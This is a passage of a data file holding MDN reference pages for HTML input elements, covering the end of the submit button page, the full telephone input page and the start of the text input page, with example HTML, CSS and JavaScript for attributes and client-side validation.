sure to provide this information in a way that doesn't interfere with the site design (for example by providing an easily accessible link that points to information on what the site access keys are). Adding a tooltip to the button (using the [`title`](../../global_attributes/title) attribute) can also help, although it's not a complete solution for accessibility purposes.\n\n### Disabling and enabling a submit button\n\nTo disable a submit button, specify the [`disabled`](../../attributes/disabled) attribute on it, like so:\n\nhtml\n\n```\n<input type=\"submit\" value=\"Send\" disabled />\n```\n\nYou can enable and disable buttons at run time by setting `disabled` to `true` or `false`; in JavaScript this looks like `btn.disabled = true` or `btn.disabled = false`.\n\n**Note:** See the [`<input type=\"button\">`](button#disabling_and_enabling_a_button) page for more ideas about enabling and disabling buttons.\n\n## Validation\n\nSubmit buttons don't participate in constraint validation; they have no real value to be constrained.\n\n## Examples\n\nWe've included simple examples above. There isn't really anything more to say about submit buttons. There's a reason this kind of control is sometimes called a \"simple button.\"\n\n## Technical Summary\n\n|                                 |                                                                                               |\n|---------------------------------|-----------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string used as the button's label                                                           |\n| **Events**                      | [`click`](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event)               |\n| **Supported common attributes** | [`type`](../input#type) and [`value`](../input#value)                                         |\n| **IDL attributes**              | `value`                                                                                       |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)       |\n| **Methods**                     | None                                                                                          |\n| **Implicit ARIA Role**          | [`button`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/button_role) |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<input>`](../input) and the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) interface which implements it.\n- [Forms and buttons](https://developer.mozilla.org/en-US/docs/Learn/Forms/Basic_native_form_controls#actual_buttons)\n- [HTML forms](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- The [`<button>`](../button) element\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/submit](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/submit)"
- name: input type="tel"
  summary: <input> elements of type tel are used to let the user enter and edit a telephone number
  description: "# \\<input type=\"tel\"\\>\n\n[`<input>`](../input) elements of type `tel` are used to let the user enter and edit a telephone number. Unlike [`<input type=\"email\">`](email) and [`<input type=\"url\">`](url), the input value is not automatically validated to a particular format before the form can be submitted, because formats for telephone numbers vary so much around the world.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"tel\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"phone\">\n      Enter your phone number:<br />\n      <small>Format: 123-456-7890</small>\n    </label>\n\n    <input type=\"tel\" id=\"phone\" name=\"phone\" pattern=\"[0-9]{3}-[0-9]{3}-[0-9]{4}\" required />\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nDespite the fact that inputs of type `tel` are functionally identical to standard `text` inputs, they do serve useful purposes; the most quickly apparent of these is that mobile browsers — especially on mobile phones — may opt to present a custom keypad optimized for entering phone numbers. Using a specific input type for telephone numbers also makes adding custom validation and handling of phone numbers more convenient.\n\n**Note:** Browsers that don't support type `tel` fall back to being a standard [text](text) input.\n\n## Value\n\nThe [`<input>`](../input) element's [`value`](../input#value) attribute contains a string that either represents a telephone number or is an empty string (`\"\"`).\n\n## Additional attributes\n\nIn addition to the attributes that operate on all [`<input>`](../input) elements regardless of their type, telephone number inputs support the following attributes.\n\n### list\n\nThe values of the list attribute is the [`id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) of a [`<datalist>`](../datalist) element located in the same document. The [`<datalist>`](../datalist) provides a list of predefined values to suggest to the user for this input. Any values in the list that are not compatible with the [`type`](../input#type) are not included in the suggested options. The values provided are suggestions, not requirements: users can select from this predefined list or provide a different value.\n\n### maxlength\n\nThe maximum string length (measured in UTF-16 code units) that the user can enter into the telephone number field. This must be an integer value of 0 or higher. If no `maxlength` is specified, or an invalid value is specified, the telephone number field has no maximum length. This value must also be greater than or equal to the value of `minlength`.\n\nThe input will fail [constraint validation](../../constraint_validation) if the length of the text entered into the field is greater than `maxlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### minlength\n\nThe minimum string length (measured in UTF-16 code units) that the user can enter into the telephone number field. This must be a non-negative integer value smaller than or equal to the value specified by `maxlength`. If no `minlength` is specified, or an invalid value is specified, the telephone number input has no minimum length.\n\nThe telephone number field will fail [constraint validation](../../constraint_validation) if the length of the text entered into the field is fewer than `minlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### pattern\n\nThe `pattern` attribute, when specified, is a regular expression that the input's [`value`](../input#value) must match for the value to pass [constraint validation](../../constraint_validation). It must be a valid JavaScript regular expression, as used by the [`RegExp`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp) type, and as documented in our [guide on regular expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions); the `'u'` flag is specified when compiling the regular expression so that the pattern is treated as a sequence of Unicode code points, instead of as [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII). No forward slashes should be specified around the pattern text.\n\nIf the specified pattern is not specified or is invalid, no regular expression is applied and this attribute is ignored completely.\n\n**Note:** Use the [`title`](../input#title) attribute to specify text that most browsers will display as a tooltip to explain what the requirements are to match the pattern. You should also include other explanatory text nearby.\n\nSee [Pattern validation](#pattern_validation) below for details and an example.\n\n### placeholder\n\nThe `placeholder` attribute is a string that provides a brief hint to the user as to what kind of information is expected in the field. It should be a word or short phrase that demonstrates the expected type of data, rather than an explanatory message. The text *must not* include carriage returns or line feeds.\n\nIf the control's content has one directionality ([LTR](https://developer.mozilla.org/en-US/docs/Glossary/LTR) or [RTL](https://developer.mozilla.org/en-US/docs/Glossary/RTL)) but needs to present the placeholder in the opposite directionality, you can use Unicode bidirectional algorithm formatting characters to override directionality within the placeholder; see [How to use Unicode controls for bidi text](https://www.w3.org/International/questions/qa-bidi-unicode-controls) for more information.\n\n**Note:** Avoid using the `placeholder` attribute if you can. It is not as semantically useful as other ways to explain your form, and can cause unexpected technical issues with your content. See [`<input>` labels](../input#labels) for more information.\n\n### readonly\n\nA Boolean attribute which, if present, means this field cannot be edited by the user. Its `value` can, however, still be changed by JavaScript code directly setting the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` property.\n\n**Note:** Because a read-only field cannot have a value, `required` does not have any effect on inputs with the `readonly` attribute also specified.\n\n### size\n\nThe `size` attribute is a numeric value indicating how many characters wide the input field should be. The value must be a number greater than zero, and the default value is 20. Since character widths vary, this may or may not be exact and should not be relied upon to be so; the resulting input may be narrower or wider than the specified number of characters, depending on the characters and the font ([`font`](https://developer.mozilla.org/en-US/docs/Web/CSS/font) settings in use).\n\nThis does *not* set a limit on how many characters the user can enter into the field. It only specifies approximately how many can be seen at a time. To set an upper limit on the length of the input data, use the [`maxlength`](#maxlength) attribute.\n\n## Non-standard attributes\n\nThe following non-standard attributes are available to telephone number input fields. As a general rule, you should avoid using them unless it can't be helped.\n\n### autocorrect\n\nA Safari extension, the `autocorrect` attribute is a string which indicates whether to activate automatic correction while the user is editing this field. Permitted values are:\n\n[`on`](#on)  \nEnable automatic correction of typos, as well as processing of text substitutions if any are configured.\n\n[`off`](#off)  \nDisable automatic correction and text substitutions.\n\n## Using tel inputs\n\nTelephone numbers are a very commonly collected type of data on the web. When creating any kind of registration or e-commerce site, for example, you will likely need to ask the user for a telephone number, whether for business purposes or for emergency contact purposes. Given how commonly-entered phone numbers are, it's unfortunate that a \"one size fits all\" solution for validating phone numbers is not practical.\n\nFortunately, you can consider the requirements of your own site and implement an appropriate level of validation yourself. See [Validation](#validation), below, for details.\n\n### Custom keyboards\n\nOne of the main advantages of `<input type=\"tel\">` is that it causes mobile browsers to display a special keyboard for entering phone numbers. For example, here's what the keypads look like on a couple of devices.\n\n| Firefox for Android | WebKit iOS (Safari/Chrome/Firefox) |\n|---------------------|------------------------------------|\n|                     |                                    |\n\n### A simple tel input\n\nIn its most basic form, a tel input can be implemented like this:\n\nhtml\n\n```\n<label for=\"telNo\">Phone number:</label>\n<input id=\"telNo\" name=\"telNo\" type=\"tel\" />\n```\n\nThere is nothing magical going on here. When submitted to the server, the above input's data would be represented as, for example, `telNo=+12125553151`.\n\n### Placeholders\n\nSometimes it's helpful to offer an in-context hint as to what form the input data should take. This can be especially important if the page design doesn't offer descriptive labels for each [`<input>`](../input). This is where **placeholders** come in. A placeholder is a value that demonstrates the form the `value` should take by presenting an example of a valid value, which is displayed inside the edit box when the element's `value` is `\"\"`. Once data is entered into the box, the placeholder disappears; if the box is emptied, the placeholder reappears.\n\nHere, we have an `tel` input with the placeholder `123-4567-8901`. Note how the placeholder disappears and reappears as you manipulate the contents of the edit field.\n\nhtml\n\n```\n<input id=\"telNo\" name=\"telNo\" type=\"tel\" placeholder=\"123-4567-8901\" />\n```\n\n### Controlling the input size\n\nYou can control not only the physical length of the input box, but also the minimum and maximum lengths allowed for the input text itself.\n\n#### Physical input element size\n\nThe physical size of the input box can be controlled using the [`size`](../input#size) attribute. With it, you can specify the number of characters the input box can display at a time. In this example, for instance, the `tel` edit box is 20 characters wide:\n\nhtml\n\n```\n<input id=\"telNo\" name=\"telNo\" type=\"tel\" size=\"20\" />\n```\n\n#### Element value length\n\nThe `size` is separate from the length limitation on the entered telephone number. You can specify a minimum length, in characters, for the entered telephone number using the [`minlength`](../input#minlength) attribute; similarly, use [`maxlength`](../input#maxlength) to set the maximum length of the entered telephone number.\n\nThe example below creates a 20-character wide telephone number entry box, requiring that the contents be no shorter than 9 characters and no longer than 14 characters.\n\nhtml\n\n```\n<input\n  id=\"telNo\"\n  name=\"telNo\"\n  type=\"tel\"\n  size=\"20\"\n  minlength=\"9\"\n  maxlength=\"14\" />\n```\n\n**Note:** The above attributes do affect [Validation](#validation) — the above example's inputs will count as invalid if the length of the value is less than 9 characters, or more than 14. Most browser won't even let you enter a value over the max length.\n\n### Providing default options\n\n#### Providing a single default using the value attribute\n\nAs always, you can provide a default value for an `tel` input box by setting its [`value`](../input#value) attribute:\n\nhtml\n\n```\n<input id=\"telNo\" name=\"telNo\" type=\"tel\" value=\"333-4444-4444\" />\n```\n\n#### Offering suggested values\n\nTaking it a step further, you can provide a list of default phone number values from which the user can select. To do this, use the [`list`](../input#list) attribute. This doesn't limit the user to those options, but does allow them to select commonly-used telephone numbers more quickly. This also offers hints to [`autocomplete`](../input#autocomplete). The `list` attribute specifies the ID of a [`<datalist>`](../datalist) element, which in turn contains one [`<option>`](../option) element per suggested value; each `option`'s `value` is the corresponding suggested value for the telephone number entry box.\n\nhtml\n\n```\n<label for=\"telNo\">Phone number: </label>\n<input id=\"telNo\" name=\"telNo\" type=\"tel\" list=\"defaultTels\" />\n\n<datalist id=\"defaultTels\">\n  <option value=\"111-1111-1111\"></option>\n  <option value=\"122-2222-2222\"></option>\n  <option value=\"333-3333-3333\"></option>\n  <option value=\"344-4444-4444\"></option>\n</datalist>\n```\n\nWith the [`<datalist>`](../datalist) element and its [`<option>`](../option)s in place, the browser will offer the specified values as potential values for the phone number; this is typically presented as a popup or drop-down menu containing the suggestions. While the specific user experience may vary from one browser to another, typically clicking in the edit box presents a drop-down of the suggested phone numbers. Then, as the user types, the list is adjusted to show only filtered matching values. Each typed character narrows down the list until the user makes a selection or types a custom value.\n\nHere's a screenshot of what that might look like:\n\n## Validation\n\nAs we've touched on before, it's quite difficult to provide a one-size-fits-all client-side validation solution for phone numbers. So what can we do? Let's consider some options.\n\n**Warning:** HTML form validation is *not* a substitute for server-side scripts that ensure the entered data is in the proper format before it is allowed into the database. It's far too easy for someone to make adjustments to the HTML that allow them to bypass the validation, or to remove it entirely. It's also possible for someone to bypass your HTML entirely and submit the data directly to your server. If your server-side code fails to validate the data it receives, disaster could strike when improperly-formatted data (or data which is too large, is of the wrong type, and so forth) is entered into your database.\n\n### Making telephone numbers required\n\nYou can make it so that an empty input is invalid and won't be submitted to the server using the [`required`](../input#required) attribute. For example, let's use this HTML:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"telNo\">Enter a telephone number (required): </label>\n    <input id=\"telNo\" name=\"telNo\" type=\"tel\" required />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nAnd let's include the following CSS to highlight valid entries with a checkmark and invalid entries with a cross:\n\ncss\n\n```\ndiv {\n  margin-bottom: 10px;\n  position: relative;\n}\n\ninput[type=\"number\"] {\n  width: 100px;\n}\n\ninput + span {\n  padding-right: 30px;\n}\n\ninput:invalid + span::after {\n  position: absolute;\n  content: \"✖\";\n  padding-left: 5px;\n  color: #8b0000;\n}\n\ninput:valid + span::after {\n  position: absolute;\n  content: \"✓\";\n  padding-left: 5px;\n  color: #009000;\n}\n```\n\nThe output looks like this:\n\n### Pattern validation\n\nIf you want to further restrict entered numbers so they also have to conform to a specific pattern, you can use the [`pattern`](../input#pattern) attribute, which takes as its value a [regular expression](https://developer.mozilla.org/en-US/docs/Glossary/Regular_expression) that entered values have to match.\n\nIn this example we'll use the same CSS as before, but our HTML is changed to look like this:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"telNo\">\n      Enter a telephone number (in the form xxx-xxx-xxxx):\n    </label>\n    <input\n      id=\"telNo\"\n      name=\"telNo\"\n      type=\"tel\"\n      required\n      pattern=\"[0-9]{3}-[0-9]{3}-[0-9]{4}\" />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nNotice how the entered value is reported as invalid unless the pattern xxx-xxx-xxxx is matched; for instance, 41-323-421 won't be accepted. Neither will 800-MDN-ROCKS. However, 865-555-6502 will be accepted. This particular pattern is obviously only useful for certain locales — in a real application you'd probably have to vary the pattern used depending on the locale of the user.\n\n## Examples\n\nIn this example, we present a simple interface with a [`<select>`](../select) element that lets the user choose which country they're in, and a set of `<input type=\"tel\">` elements to let them enter each part of their phone number; there is no reason why you can't have multiple `tel` inputs.\n\nEach input has a [`placeholder`](../input#placeholder) attribute to show a hint to sighted users about what to enter into it, a [`pattern`](../input#pattern) to enforce a specific number of characters for the desired section, and an [`aria-label`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-label) attribute to contain a hint to be read out to screen reader users about what to enter into it.\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"country\">Choose your country:</label>\n    <select id=\"country\" name=\"country\">\n      <option>UK</option>\n      <option selected>US</option>\n      <option>Germany</option>\n    </select>\n  </div>\n  <div>\n    <p>Enter your telephone number:</p>\n    <span class=\"areaDiv\">\n      <input\n        id=\"areaNo\"\n        name=\"areaNo\"\n        type=\"tel\"\n        required\n        placeholder=\"Area code\"\n        pattern=\"[0-9]{3}\"\n        aria-label=\"Area code\" />\n      <span class=\"validity\"></span>\n    </span>\n    <span class=\"number1Div\">\n      <input\n        id=\"number1\"\n        name=\"number1\"\n        type=\"tel\"\n        required\n        placeholder=\"First part\"\n        pattern=\"[0-9]{3}\"\n        aria-label=\"First part of number\" />\n      <span class=\"validity\"></span>\n    </span>\n    <span class=\"number2Div\">\n      <input\n        id=\"number2\"\n        name=\"number2\"\n        type=\"tel\"\n        required\n        placeholder=\"Second part\"\n        pattern=\"[0-9]{4}\"\n        aria-label=\"Second part of number\" />\n      <span class=\"validity\"></span>\n    </span>\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nThe JavaScript is relatively simple — it contains an [`onchange`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) event handler that, when the `<select>` value is changed, updates the `<input>` element's `pattern`, `placeholder`, and `aria-label` to suit the format of telephone numbers in that country/territory.\n\njs\n\n```\nconst selectElem = document.querySelector(\"select\");\nconst inputElems = document.querySelectorAll(\"input\");\n\nselectElem.onchange = () => {\n  for (let i = 0; i < inputElems.length; i++) {\n    inputElems[i].value = \"\";\n  }\n\n  if (selectElem.value === \"US\") {\n    inputElems[2].parentNode.style.display = \"inline\";\n\n    inputElems[0].placeholder = \"Area code\";\n    inputElems[0].pattern = \"[0-9]{3}\";\n\n    inputElems[1].placeholder = \"First part\";\n    inputElems[1].pattern = \"[0-9]{3}\";\n    inputElems[1].setAttribute(\"aria-label\", \"First part of number\");\n\n    inputElems[2].placeholder = \"Second part\";\n    inputElems[2].pattern = \"[0-9]{4}\";\n    inputElems[2].setAttribute(\"aria-label\", \"Second part of number\");\n  } else if (selectElem.value === \"UK\") {\n    inputElems[2].parentNode.style.display = \"none\";\n\n    inputElems[0].placeholder = \"Area code\";\n    inputElems[0].pattern = \"[0-9]{3,6}\";\n\n    inputElems[1].placeholder = \"Local number\";\n    inputElems[1].pattern = \"[0-9]{4,8}\";\n    inputElems[1].setAttribute(\"aria-label\", \"Local number\");\n  } else if (selectElem.value === \"Germany\") {\n    inputElems[2].parentNode.style.display = \"inline\";\n\n    inputElems[0].placeholder = \"Area code\";\n    inputElems[0].pattern = \"[0-9]{3,5}\";\n\n    inputElems[1].placeholder = \"First part\";\n    inputElems[1].pattern = \"[0-9]{2,4}\";\n    inputElems[1].setAttribute(\"aria-label\", \"First part of number\");\n\n    inputElems[2].placeholder = \"Second part\";\n    inputElems[2].pattern = \"[0-9]{4}\";\n    inputElems[2].setAttribute(\"aria-label\", \"Second part of number\");\n  }\n};\n```\n\nThe example looks like this:\n\nThis is an interesting idea, which goes to show a potential solution to the problem of dealing with international phone numbers. You would have to extend the example of course to provide the correct pattern for potentially every country, which would be a lot of work, and there would still be no foolproof guarantee that the users would enter their numbers correctly.\n\nIt makes you wonder if it is worth going to all this trouble on the client-side, when you could just let the user enter their number in whatever format they wanted on the client-side and then validate and sanitize it on the server. But this choice is yours to make.\n\n## Technical Summary\n\n|                                 |                                                                                                                                                                                                                                                                                                          |                                                                                                                          |\n|---------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing a telephone number, or empty                                                                                                                                                                                                                                                       |                                                                                                                          |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                                                |                                                                                                                          |\n| **Supported common attributes** | [`autocomplete`](../input#autocomplete), [`list`](../input#list), [`maxlength`](../input#maxlength), [`minlength`](../input#minlength), [`pattern`](../input#pattern), [`placeholder`](../input#placeholder), [`readonly`](../input#readonly), and [`size`](../input#size)                               |                                                                                                                          |\n| **IDL attributes**              | `list`, `selectionStart`, `selectionEnd`, `selectionDirection`, and `value`                                                                                                                                                                                                                              |                                                                                                                          |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                                                  |                                                                                                                          |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select), [`setRangeText()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setRangeText), [`setSelectionRange()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange) |                                                                                                                          |\n| **Implicit ARIA Role**          | with no `list` attribute: [`textbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/textbox_role)                                                                                                                                                                                | with `list` attribute: [`combobox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/combobox_role) |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [HTML forms guide](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- [`<input>`](../input)\n  - [`<input type=\"text\">`](text)\n  - [`<input type=\"email\">`](email)\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/tel](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/tel)"
- name: input type="text"
  summary: <input> elements of type text create basic single-line text fields
  description: "# \\<input type=\"text\"\\>\n\n[`<input>`](../input) elements of type `text` create basic single-line text fields.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"text\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"name\">Name (4 to 8 characters):</label>\n\n    <input type=\"text\" id=\"name\" name=\"name\" required minlength=\"4\" maxlength=\"8\" size=\"10\" />\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Value\n\nThe [`value`](../input#value) attribute is a string that contains the current value of the text entered into the text field. You can retrieve this using the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` property in JavaScript.\n\njs\n\n```\nlet theText = myTextInput.value;\n```\n\nIf no validation constraints are in place for the input (see [Validation](#validation) for more details), the value may be an empty string (`\"\"`).\n\n## Additional attributes\n\nIn addition to the attributes that operate on all [`<input>`](../input) elements regardless of their type, text inputs support the following attributes.\n\n### `list`\n\nThe values of the list attribute is the [`id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) of a [`<datalist>`](../datalist) element located in the same document. The [`<datalist>`](../datalist) provides a list of predefined values to suggest to the user for this input. Any values in the list that are not compatible with the [`type`](../input#type) are not included in the suggested options. The values provided are suggestions, not requirements: users can select from this predefined list or provide a different value.\n\n### `maxlength`\n\nThe maximum string length (measured in UTF-16 code units) that the user can enter into the `text` input. This must be an integer value of 0 or higher. If no `maxlength` is specified, or an invalid value is specified, the `text` input has no maximum length. This value must also be greater than or equal to the value of `minlength`.\n\nThe input will fail [constraint validation](../../constraint_validation) if the length of the text value of the field is greater than `maxlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### `minlength`\n\nThe minimum string length (measured in UTF-16 code units) that the user can enter into the `text` input. This must be a non-negative integer value smaller than or equal to the value specified by `maxlength`. If no `minlength` is specified, or an invalid value is specified, the `text` input has no minimum length.\n\nThe input will fail [constraint validation](../../constraint_validation) if the length of the text entered into the field is fewer than `minlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### `pattern`\n\nThe `pattern` attribute, when specified, is a regular expression that the input's [`value`](../input#value) must match for the value to pass [constraint validation](../../constraint_validation). It must be a valid JavaScript regular expression, as used by the [`RegExp`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp) type, and as documented in our [guide on regular expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions); the `'u'` flag is specified when compiling the regular expression so that the pattern is treated as a sequence of Unicode code points, instead of as [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII). No forward slashes should be specified around the pattern text.\n\nIf the specified pattern is not specified or is invalid, no regular expression is applied and this attribute is ignored completely.\n\n**Note:** Use the [`title`](../input#title) attribute to specify text that most browsers will display as a tooltip to explain what the requirements are to match the pattern. You should also include other explanatory text nearby.\n\nSee [Specifying a pattern](#specifying_a_pattern) for further details and an example.\n\n### `placeholder`\n\nThe `placeholder` attribute is a string that provides a brief hint to the user as to what kind of information is expected in the field. It should be a word or short phrase that demonstrates the expected type of data, rather than an explanatory message. The text *must not* include carriage returns or line feeds.\n\nIf the control's content has one directionality ([LTR](https://developer.mozilla.org/en-US/docs/Glossary/LTR) or [RTL](https://developer.mozilla.org/en-US/docs/Glossary/RTL)) but needs to present the placeholder in the opposite directionality, you can use Unicode bidirectional algorithm formatting characters to override directionality within the placeholder; see [How to use Unicode controls for bidi text](https://www.w3.org/International/questions/qa-bidi-unicode-controls) for more information.\n\n**Note:** Avoid using the `placeholder` attribute if you can. It is not as semantically useful as other ways to explain your form, and can cause unexpected technical issues with your content. See [`<input>` accessibility concerns](../input#accessibility_concerns) for more information.\n\n### `readonly`\n\nA Boolean attribute which, if present, means this field cannot be edited by the user. Its `value` can, however, still be changed by JavaScript code directly setting the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` property.\n\n**Note:** Because a read-only field cannot have a value, `required` does not have any effect on inputs with the `readonly` attribute also specified.\n\n### `size`\n\nThe `size` attribute is a numeric value indicating how many characters wide the input field should be. The value must be a number greater than zero, and the default value is 20. Since character widths vary, this may or may not be exact and should not be relied upon to be so; the resulting input may be narrower or wider than the specified number of characters, depending on the characters and the font ([`font`](https://developer.mozilla.org/en-US/docs/Web/CSS/font) settings in use).\n\nThis does *not* set a limit on how many characters the user can enter into the field. It only specifies approximately how many can be seen at a time. To set an upper limit on the length of the input data, use the [`maxlength`](#maxlength) attribute.\n\n### `spellcheck`\n\nThe [`spellcheck`](../../global_attributes#spellcheck) global attribute is used to indicate whether to enable spell-checking for an element. It can be used on any editable content, but here we consider specifics related to the use of `spellcheck` on [`<input>`](../input) elements. The permitted values for `spellcheck` are:\n\n[`false`](#false)  \nDisable spell-checking for this element.\n\n[`true`](#true)  \nEnable spell-checking for this element.\n\n[`\"\"`](#sect4) (empty string) or no value  \nFollow the element's default behavior for spell-checking. This may be based upon a parent's `spellcheck` setting or other factors.\n\nAn input field can have spell-checking enabled if it doesn't have the [readonly](#readonly) attribute set and is not disabled.\n\nThe value returned by reading `spellcheck` may not reflect the actual state of spell-checking within a control, if the [user agent's](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) preferences override the setting.\n\n## Non-standard attributes\n\nThe following non-standard attributes are also available on some browsers. As a general rule, you should avoid using them unless it can't be helped.\n\n### `autocorrect`\n\nA Safari extension, the `autocorrect` attribute is a string that indicates whether to activate automatic correction while the user is editing this field. Permitted values are:\n\n[`on`](#on)  \nEnable automatic correction of typos, as well as processing of text substitutions if any are configured.\n\n[`off`](#off)  \nDisable automatic correction and text substitutions.\n\n## Using text inputs\n\n`<input>` elements of type `text` create basic, single-line inputs. You should use them anywhere you want the user to enter a single-line value and there isn't a more specific input type available for collecting that value (for example, if it's a [date](datetime-local), [URL](url), [email](email), or [search term](search), you've got better options available).\n\n### Basic example\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"uname\">Choose a username: </label>\n    <input type=\"text\" id=\"uname\" name=\"name\" />\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nThis renders like so:\n\nWhen submitted, the data name/value pair sent to the server will be `name=Chris` (if \"Chris\" was entered as the input value before submission). You must remember to include [`name`](../input#name) attribute on the [`<input>`](../input) element, otherwise the text field's value won't be included with the submitted data.\n\n### Setting placeholders\n\nYou can provide a useful placeholder inside your text input that can provide a hint as to what to enter by including using the [`placeholder`](../input#placeholder) attribute. Look at the following example:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"uname\">Choose a username: </label>\n    <input\n      type=\"text\"\n      id=\"uname\"\n      name=\"name\"\n      placeholder=\"Lower case, all one word\" />\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nYou can see how the placeholder is rendered below:\n\nThe placeholder is typically rendered in a lighter color than the element's foreground color, and automatically vanishes when the user begins to enter text into the field (or whenever the field has a value set programmatically by setting its `value` attribute).\n\n### Physical input element size\n\nThe physical size of the input box can be controlled using the [`size`](../input#size) attribute. With it, you can specify the number of characters the text input can display at a time. This affects the width of the element, letting you specify the width in terms of characters rather than pixels. In this example, for instance, the input is 30 characters wide:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"uname\">Choose a username: </label>\n    <input\n      type=\"text\"\n      id=\"uname\"\n      name=\"name\"\n      placeholder=\"Lower case, all one word\"\n      size=\"30\" />\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\n## Validation\n\n`<input>` elements of type `text` have no automatic validation applied to them (since a basic text input needs to be capable of accepting any arbitrary string), but there are some client-side validation options available, which we'll discuss below.\n\n**Note:** HTML form validation is *not* a substitute for server-scripts that ensure the entered data is in the proper format. It's far too easy for someone to make adjustments to the HTML that allow them to bypass the validation, or to remove it entirely. It's also possible for someone to bypass your HTML entirely and submit the data directly to your server. If your server-side code fails to validate the data it receives, disaster could strike when improperly-formatted data (or data which is too large, is of the wrong type, and so forth) is entered into your database.\n\n### A note on styling\n\nThere are useful pseudo-classes available for styling form elements to help the user see when their values are valid or invalid. These are [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid). In this section, we'll use the following CSS, which will place a check (tick) mark next to inputs containing valid values, and a cross (X) next to inputs containing invalid values.\n\ncss\n\n```\ndiv {\n  margin-bottom: 10px;\n  position: relative;\n}\n\ninput + span {\n  padding-right: 30px;\n}\n\ninput:invalid + span::after {\n  position: absolute;\n  content: \"✖\";\n  padding-left: 5px;\n}\n\ninput:valid + span::after {\n  position: 